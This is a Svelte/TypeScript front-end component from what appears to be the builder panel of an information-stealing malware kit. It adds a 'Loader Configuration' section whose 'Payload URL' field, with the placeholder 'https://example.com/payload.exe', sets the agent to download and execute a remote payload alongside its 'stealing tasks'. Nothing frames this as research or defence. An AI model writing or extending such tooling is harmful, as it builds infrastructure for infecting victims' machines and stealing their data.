<script lang="ts">
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { ArrowDownToLine, ChevronRight } from "@lucide/svelte";
  import * as Collapsible from "$lib/components/ui/collapsible";

  let {
    loaderUrl = "",
    onLoaderUrlChange = (val: string) => {},
  } = $props();

  let isOpen = $state(false);
</script>

<Collapsible.Root bind:open={isOpen} class="space-y-4">
  <Collapsible.Trigger class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground hover:text-foreground transition-colors outline-none group">
    <ArrowDownToLine class="h-4 w-4 text-primary" />
    <span>Loader Configuration</span>
    <ChevronRight class="h-4 w-4 transition-transform duration-200 {isOpen ? 'rotate-90' : ''}" />
  </Collapsible.Trigger>
  
  <Collapsible.Content class="space-y-2 pt-2">
    <Label class="text-xs text-muted-foreground" for="loader-url">
      Payload URL (Optional)
    </Label>
    <Input
      id="loader-url"
      placeholder="https://example.com/payload.exe"
      value={loaderUrl}
      oninput={(e) => onLoaderUrlChange(e.currentTarget.value)}
    />
    <p class="text-[10px] text-muted-foreground">
      If set, the agent will download and execute this payload concurrently with stealing tasks.
    </p>
  </Collapsible.Content>
</Collapsible.Root>
